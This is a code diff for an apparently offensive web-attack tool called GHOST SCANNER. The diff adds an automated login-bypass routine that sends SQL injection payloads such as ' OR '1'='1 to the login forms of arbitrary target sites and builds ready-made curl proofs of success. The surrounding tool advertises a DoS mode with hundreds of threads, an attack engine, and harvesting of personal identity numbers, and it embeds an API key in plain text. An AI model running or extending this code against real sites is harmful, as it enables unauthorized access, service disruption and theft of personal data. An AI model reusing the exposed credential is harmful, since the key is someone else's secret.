@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-GHOST SCANNER v3.6 – ULTRA SAVAGE+
-- Deface Detection
-- AI Model: claude-opus-5 (CodeCraft)
+GHOST SCANNER v3.7 – ULTRA SAVAGE+
+- AI Timeout fix (120s + retry)
+- Login Bypass (SQL injection on login forms)
 - 1M+ SQLi & XSS payloads
-- PoC generation, PDF, AI analysis
-- Cross-platform (Windows, Linux, Termux, Arch)
+- Deface Detection, SQL Extraction, PoC, PDF, AI
 """
 
 import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl
@@ -32,7 +31,7 @@ warnings.filterwarnings('ignore')
 # ========== KONFIGURASI AI ==========
 AI_API_KEY = 'cc_A07j2YrgUcJAfx2UuMIi3F3qohhXV3DCADQmfYYhTh0hvpxF'
 AI_BASE_URL = 'https://codecraftapi.com/v1'
-AI_MODEL = 'claude-opus-5'  # sesuai permintaan
+AI_MODEL = 'claude-opus-5'
 
 # ========== BANNER ==========
 BANNER_SKULL = r"""
@@ -61,7 +60,7 @@ def show_banner():
     skull = Text(BANNER_SKULL, style="bold red")
     swords = Text(BANNER_SWORDS, style="bold yellow")
     title = Text("GHOST SCANNER", style="bold cyan")
-    version = Text("Version 3.6 | ULTRA SAVAGE+", style="green")
+    version = Text("Version 3.7 | ULTRA SAVAGE+", style="green")
     made = Text("Made by GhostTeam", style="magenta")
     date = Text(f"Created at {datetime.now().strftime('%Y-%m-%d')}", style="white")
     copyright = Text("ALL COPYRIGHT RESERVED", style="bold red")
@@ -104,7 +103,7 @@ def show_help():
   -h, --help             Show this help menu
 
 [bold green]EXAMPLES:[/bold green]
-  python3 ghostscanner.py -u https://target.com -v --ai --pdf
+  python ghostscanner.py -u https://target.com -v --ai --pdf
   python3 ghostscanner.py -u https://target.com --proxy-list proxies.txt --validate-proxy
   python3 ghostscanner.py -u https://target.com --dos --threads 500 --duration 60
 
@@ -125,7 +124,7 @@ class GhostScanner:
         self.quick = quick
         self.pdf = pdf
         self.ai = ai
-        self.version = "3.6 ULTRA SAVAGE+"
+        self.version = "3.7 ULTRA SAVAGE+"
         self.release_date = "2026-09-08"
         self.results_scan = {
             "target": "",
@@ -142,7 +141,7 @@ class GhostScanner:
                 "xss_dom": [], "xss_stored": [], "xss_reflected": [],
                 "business_logic": [], "improper_input_validation": [],
                 "mass_assignment": [], "rate_limit": [],
-                "deface": []  # new
+                "deface": [], "login_bypass": []
             },
             "sensitive_data": {
                 "emails": [], "phones": [], "nik": [], "npwp": [], "ktp": [],
@@ -597,7 +596,6 @@ class GhostScanner:
 
     # ========== DEFACE DETECTION ==========
     def _check_deface(self, url):
-        """Check if a website is defaced by looking for indicators."""
         findings = []
         try:
             resp = self._smart_request(url, timeout=8)
@@ -636,8 +634,66 @@ class GhostScanner:
                     "indicators": found
                 })
         except Exception as e:
-            # ignore
             pass
+        return findings
+
+    # ========== LOGIN BYPASS ==========
+    def _check_login_bypass(self, forms, base_url):
+        findings = []
+        for form in forms:
+            # Check if it's a login form: has password field and action likely login
+            inputs = form.get('inputs', [])
+            has_pass = any('password' in inp.get('type', '').lower() for inp in inputs)
+            action = form.get('url', base_url)
+            is_login = (
+                has_pass and
+                ('login' in action.lower() or 'auth' in action.lower() or 'signin' in action.lower() or
+                 'admin' in action.lower() or 'log-in' in action.lower())
+            )
+            if not is_login:
+                continue
+            # Find username and password fields
+            user_field = None
+            pass_field = None
+            for inp in inputs:
+                name = inp.get('name', '')
+                if 'user' in name.lower() or 'email' in name.lower():
+                    user_field = name
+                if 'pass' in name.lower() or 'password' in name.lower():
+                    pass_field = name
+            if not user_field or not pass_field:
+                continue
+
+            method = form.get('method', 'POST')
+            # Try payloads
+            sqli_payloads = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "' UNION SELECT NULL--"]
+            for payload in sqli_payloads:
+                data = {user_field: payload, pass_field: payload}
+                try:
+                    resp = self._smart_request(action, timeout=5, method=method, data=data)
+                    if not resp:
+                        continue
+                    body_lower = resp.text.lower()
+                    if 'dashboard' in body_lower or 'welcome' in body_lower or 'admin' in body_lower or resp.status_code == 302:
+                        poc = {
+                            "url": action,
+                            "curl": f"curl -X {method} \"{action}\" -d \"{user_field}={payload}&{pass_field}={payload}\"",
+                            "response": resp.text[:300] + "...",
+                            "statusCode": resp.status_code,
+                            "timeDiff": "N/A"
+                        }
+                        findings.append({
+                            "type": "Login Bypass (SQL Injection)",
+                            "param": user_field,
+                            "payload": payload,
+                            "evidence": "Successfully bypassed authentication",
+                            "risk": "CRITICAL",
+                            "confidence": 95,
+                            "poc": poc
+                        })
+                        break
+                except:
+                    pass
         return findings
 
     # ---------- CHECK FUNCTIONS (dengan PoC) ----------
@@ -877,24 +933,37 @@ class GhostScanner:
         Findings: {json.dumps(findings, indent=2)}
         Please provide a professional security analysis with risk assessment and actionable recommendations. Be concise.
         """
-        try:
-            headers = {
-                'Authorization': f'Bearer {AI_API_KEY}',
-                'Content-Type': 'application/json'
-            }
-            data = {
-                "model": AI_MODEL,
-                "messages": [{"role": "user", "content": prompt}],
-                "max_tokens": 1000
-            }
-            response = requests.post(f"{AI_BASE_URL}/chat/completions", headers=headers, json=data, timeout=30)
-            if response.status_code == 200:
-                result = response.json()
-                return result['choices'][0]['message']['content']
-            else:
-                return f"AI Error: {response.status_code} - {response.text}"
-        except Exception as e:
-            return f"AI Error: {str(e)}"
+        max_retries = 3
+        timeout = 120
+        for attempt in range(max_retries):
+            try:
+                headers = {
+                    'Authorization': f'Bearer {AI_API_KEY}',
+                    'Content-Type': 'application/json'
+                }
+                data = {
+                    "model": AI_MODEL,
+                    "messages": [{"role": "user", "content": prompt}],
+                    "max_tokens": 1000
+                }
+                response = requests.post(
+                    f"{AI_BASE_URL}/chat/completions",
+                    headers=headers,
+                    json=data,
+                    timeout=timeout
+                )
+                if response.status_code == 200:
+                    result = response.json()
+                    return result['choices'][0]['message']['content']
+                else:
+                    console.print(f"[yellow]AI attempt {attempt+1} failed: {response.status_code} - {response.text}[/yellow]")
+            except requests.exceptions.Timeout:
+                console.print(f"[yellow]AI attempt {attempt+1} timed out after {timeout}s. Retrying...[/yellow]")
+                time.sleep(5)
+            except Exception as e:
+                console.print(f"[yellow]AI attempt {attempt+1} error: {str(e)}[/yellow]")
+                time.sleep(5)
+        return "AI Analysis failed after 3 attempts. Please try again later."
 
     # ========== PDF GENERATION ==========
     def _generate_pdf(self, results, output_path="report.pdf"):
@@ -1001,10 +1070,17 @@ class GhostScanner:
         deface_results = self._check_deface(target)
         self.results_scan["vulnerabilities"]["deface"] = deface_results
 
+        # ===== EXTRACT FORMS =====
+        forms = self._extract_forms(html, target)
+
+        # ===== LOGIN BYPASS =====
+        console.print("[yellow]Checking Login Bypass...[/yellow]")
+        login_results = self._check_login_bypass(forms, target)
+        self.results_scan["vulnerabilities"]["login_bypass"] = login_results
+
         # Parameters
         all_params = {}
         all_params.update(self._extract_params_from_url(target))
-        forms = self._extract_forms(html, target)
         for form in forms:
             if form['method'] == 'GET':
                 for input_name in form['inputs']:
@@ -1053,13 +1129,14 @@ class GhostScanner:
         rate_results = self._rate_limit(target)
 
         # Combine all
-        all_findings = sql_results + xss_results + biz_results + mass_results + rate_results + deface_results
+        all_findings = sql_results + xss_results + biz_results + mass_results + rate_results + deface_results + login_results
         self.results_scan["vulnerabilities"]["sql_injection"] = sql_results
         self.results_scan["vulnerabilities"]["xss"] = xss_results
         self.results_scan["vulnerabilities"]["business_logic"] = biz_results
         self.results_scan["vulnerabilities"]["mass_assignment"] = mass_results
         self.results_scan["vulnerabilities"]["rate_limit"] = rate_results
         self.results_scan["vulnerabilities"]["deface"] = deface_results
+        self.results_scan["vulnerabilities"]["login_bypass"] = login_results
 
         total_vulns = len(all_findings)
         self.results_scan["summary"]["total"] = total_vulns
@@ -1114,7 +1191,7 @@ class GhostScanner:
         console.print(table)
 
     def _generate_html_report(self, json_file):
-        # similar to before, can be enhanced
+        # Placeholder, can be enhanced
         pass
 
 # ========== UTILITY ==========
@@ -1128,7 +1205,6 @@ def build_url(base, param, payload):
 
 # ========== ATTACK ENGINE ==========
 class AttackEngine:
-    # same as previous, omitted for brevity
     def __init__(self, target, threads=200, duration=30, method='http'):
         self.target = target
         self.threads = threads
